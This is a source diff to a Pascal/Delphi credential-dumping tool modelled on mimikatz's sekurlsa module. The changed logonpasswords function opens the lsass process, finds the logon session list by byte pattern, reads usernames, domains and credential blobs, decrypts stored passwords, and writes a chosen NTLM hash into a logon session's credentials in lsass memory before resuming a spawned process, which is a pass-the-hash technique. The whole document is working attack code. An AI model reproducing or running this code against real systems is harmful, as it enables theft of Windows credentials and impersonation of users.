@@ -533,7 +533,7 @@ begin
 end;
 
 //check kuhl_m_sekurlsa_utils.c
-function logonpasswords(pid:dword;module:string;luid:int64=0):boolean;
+function logonpasswords(pid:dword;module:string;luid:int64=0;func:pointer =nil):boolean;
 const
   //dd Lsasrv!LogonSessionList in windbg
   PTRN_WN1803_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c9, $74);
@@ -547,7 +547,7 @@ const
   after:array[0..1] of byte=($eb,$04);
   //after:array[0..1] of byte=($0F,$84);
 var
-  dummy:string;
+  //dummy:string;
   hprocess,hmod:thandle;
   hmods:array[0..1023] of thandle;
   MODINFO:  MODULEINFO;
@@ -564,7 +564,7 @@ var
   bytes:array[0..1023] of byte;
   password,decrypted,output:tbytes;
   username,domain:array [0..254] of widechar;
-  credentials,ptr,first:nativeuint;
+  credentials,ptr,first,current:nativeuint;
   CREDENTIALW:_CREDENTIALW;
 begin
   if pid=0 then exit;
@@ -631,8 +631,8 @@ begin
                    begin
                     if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
                       begin
-                      dummy:=lowercase(strpas(szModName ));
-                      if pos(lowercase(module),dummy)>0 then
+                      //dummy:=lowercase(strpas(szModName ));
+                      if pos(lowercase(module),lowercase(strpas(szModName )))>0 then
                          begin
                          log(module+' found:'+inttohex(hMods[count],8),0);
                          if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
@@ -663,9 +663,10 @@ begin
                                    log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
                                    //read sesslist at offset
                                    ReadMem  (hprocess,offset,logsesslist );
-                                   dummy:=inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer));
                                    //lets skip the first one
+                                   current:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink);
                                    ReadMem  (hprocess,_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,logsesslist );
+                                   //dummy:=inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer));
                                    //lets loop
                                    //while dummy<>leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0') do
                                    //while dummy<>inttohex(offset,sizeof(pointer)) do
@@ -674,22 +675,24 @@ begin
                                    //log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
                                    if (luid=0) or (luid=_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart) then
                                    begin
+                                   if func<>nil then fn(func)(pointer(@logsesslist[0]) );
                                    log('**************************************************',1);
-                                   log('entry#next:'+dummy,0) ;
-
+                                   log('entry#current:'+inttohex(current,sizeof(pointer)),0) ;
+                                   log('entry#prev:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).blink,sizeof(pointer)),0) ;
+                                   log('entry#next:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer)),0) ;
+                                   //
+                                   log('LUID:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart ,sizeof(_LUID)),1) ;
                                    //log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
                                    //get username
-                                   ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).username.buffer),bytes );
-                                   log('username:'+strpas (pwidechar(@bytes[0])),1);
+                                   if ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).username.buffer),bytes )
+                                      then log('username:'+strpas (pwidechar(@bytes[0])),1);
                                    //copymemory(@username[0],@bytes[0],64);
                                    //log('username:'+widestring(username),1);
                                    //get domain
-                                   ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).domain.buffer),bytes );
-                                   log('domain:'+strpas (pwidechar(@bytes[0])),1);
+                                   if ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).domain.buffer),bytes )
+                                      then log('domain:'+strpas (pwidechar(@bytes[0])),1);
                                    //copymemory(@domain[0],@bytes[0],64);
                                    //log('domain:'+widestring(domain),1);
-                                   //
-                                   log('LUID:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart ,sizeof(_LUID)),1) ;
                                    //
                                    if copy(winver,1,3)='6.1'
                                       then credentials:=nativeuint(PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ  (@logsesslist[0] ).CredentialManager)
@@ -700,10 +703,10 @@ begin
                                      log('->CredentialManager:'+inttohex(credentials,sizeof(pvoid)),1);
                                      //CredentialManager
                                      ReadMem  (hprocess,credentials,bytes);
-                                     log(inttohex(Pgeneric_list (@bytes[0]).unk4  ,sizeof(nativeuint)),0);
+                                     log('unk4:'+inttohex(Pgeneric_list (@bytes[0]).unk4  ,sizeof(nativeuint)),0);
                                      ReadMem  (hprocess,Pgeneric_list (@bytes[0]).unk4,bytes);
                                      ptr:=Pgeneric_list (@bytes[0]).unk3;
-                                     log(inttohex(ptr  ,sizeof(nativeuint)),0);
+                                     log('unk3:'+inttohex(ptr  ,sizeof(nativeuint)),0);
                                      ReadMem  (hprocess,ptr,bytes);
                                      //we should loop here
                                      while 1=1 do
@@ -712,17 +715,23 @@ begin
                                      if first=0 then first:=Pgeneric_list (@bytes[0]).unk1;
                                      log('-CREDENTIALW:'+inttohex(ptr-$58  ,sizeof(nativeuint)),1);
                                      readmem(hprocess,ptr-$58,@CREDENTIALW ,sizeof(CREDENTIALW));
-                                     readmem(hprocess,nativeuint(CREDENTIALW.UserName),@username[0],sizeof(username));
-                                     log('UserName:'+ username,1) ;
-                                     readmem(hprocess,nativeuint(CREDENTIALW.TargetName ),@username[0],sizeof(username));
-                                     log('TargetName:'+ username,1) ;
+                                     if nativeuint(CREDENTIALW.UserName)>0 then
+                                       begin
+                                       if readmem(hprocess,nativeuint(CREDENTIALW.UserName),@username[0],sizeof(username))
+                                          then log('UserName:'+ username,1) ;
+                                       end;
+                                     if nativeuint(CREDENTIALW.TargetName)>0 then
+                                       begin
+                                       if readmem(hprocess,nativeuint(CREDENTIALW.TargetName ),@username[0],sizeof(username))
+                                          then log('TargetName:'+ username,1) ;
+                                       end;
                                      log('CredentialBlobSize:'+inttostr(CREDENTIALW.CredentialBlobSize),0) ;
-                                     log('CredentialBlob:'+inttohex(nativeuint(CREDENTIALW.CredentialBlob),sizeof(nativeuint)),0) ;
                                      //encrypted password is $e0 aka 224 bytes later
                                      //start of credential structure is -$58
                                      //password - $110 is the pointer to the password
                                      if CREDENTIALW.CredentialBlobSize>0 then
                                      begin
+                                     log('CredentialBlob:'+inttohex(nativeuint(CREDENTIALW.CredentialBlob),sizeof(nativeuint)),0) ;
                                      setlength(password,CREDENTIALW.CredentialBlobSize);
                                      ReadMem  (hprocess,nativeuint(CREDENTIALW.CredentialBlob),password );
                                      //log(ByteToHexaString(password),1);
@@ -787,7 +796,7 @@ begin
                                                           begin
                                                           PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash:=HexaStringToByte('87DBA060EB4C302729C00E631A42E6CD');
                                                           encryptLSA(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length,decrypted,output);
-                                                          writemem(hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),output);
+                                                          writemem(hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),@output[0],PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length);
                                                           end;//if luid<>0 then
                                                           end;
                                                        if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=14 then
@@ -803,8 +812,9 @@ begin
                                      end;//if nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials)<>0 then
                                      end; // if (luid=0) or ...
                                    //next logsesslist
+                                   current:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink);
                                    ReadMem  (hprocess,_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,logsesslist );
-                                   dummy:=inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer));
+                                   //dummy:=inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer));
                                    end;
                                    //...
 
@@ -1104,15 +1114,17 @@ begin
         then if GetTokenInformation(token,tokenstatistics,@stats,sizeof(stats),len)
            then writeln('LUID:'+inttohex(stats.AuthenticationId,sizeof(stats.AuthenticationId)));
      writeln(pi.dwProcessId );
-     //closehandle(pi.hProcess );
-     findlsakeys (lsass_pid,deskey,aeskey,iv );
-     logonpasswords (lsass_pid ,'lsasrv.dll',stats.AuthenticationId);
-     //_killproc(pi.dwProcessId); //temp
+
      end;
 
 
   //cycle thru logonsessions to match the luid
   //patch the credentialblob to stuff the ntlm hash (encrypted with encryptlsa)
+    findlsakeys (lsass_pid,deskey,aeskey,iv );
+    logonpasswords (lsass_pid ,'lsasrv.dll',stats.AuthenticationId);
+//and finally resume...
+    ResumeThread(pi.hThread );
+    //_killproc(pi.dwProcessId); //temp
 end;
 
 begin
